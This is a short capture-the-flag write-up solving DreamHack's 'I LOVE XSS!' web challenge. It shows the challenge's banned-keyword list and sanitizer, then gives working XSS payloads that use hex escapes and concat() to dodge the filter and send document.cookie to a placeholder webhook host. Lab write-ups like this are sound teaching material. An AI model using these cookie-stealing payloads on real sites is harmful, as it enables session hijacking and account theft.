# I LOVE XSS! — DreamHack

> **Room / Challenge:** I LOVE XSS! (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** I LOVE XSS! (web)
- **Link**: `https://dreamhack.io/wargame/challenges/2061`
- **Level:** `2`
- **Date:** `25-11-2025`

---

## Goal

Leveraging XSS Scriptin to get the flag.

## My Solution

The app has a banned list for XSS Scripting:

```python
banlist = ["`","'","alert(","fetch(","replace(","[","]","javascript","@","!","%","location","href","window","eval"]
```

Also in `sanitizer.py` it do allow `<script>` tag however no any attributes is allowed:

```python
import bleach

ALLOWED_TAGS = ['script']   #I only love script tags!
ALLOWED_ATTRIBUTES = {}
ALLOWED_PROTOCOLS = ['http', 'https']

def sanitize_input(user_input: str) -> str:
    return bleach.clean(
        user_input,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
        strip_comments=True
    )
```

Initially, I create a payload:

```
<script>document.write("\x3cimg src=\"https://YOUR_WEBHOOK/webhook?c="+document.cookie+"\"\x3e")</script>
```

`\x3c` and `\x3e` is HEX code of `<` and `>` and used `\"` because `'` single quote is banned. However `+` is treated as space in URL Encoded so I use concat instead:

```
<script>document.write("\x3cimg src=\"".concat("https://YOUR_WEBHOOK/webhook?c=",document.cookie,"\"\x3e"))</script>
```

Submit this payload with `curl` and get the flag:
![Guide image](./screenshots/1.png)
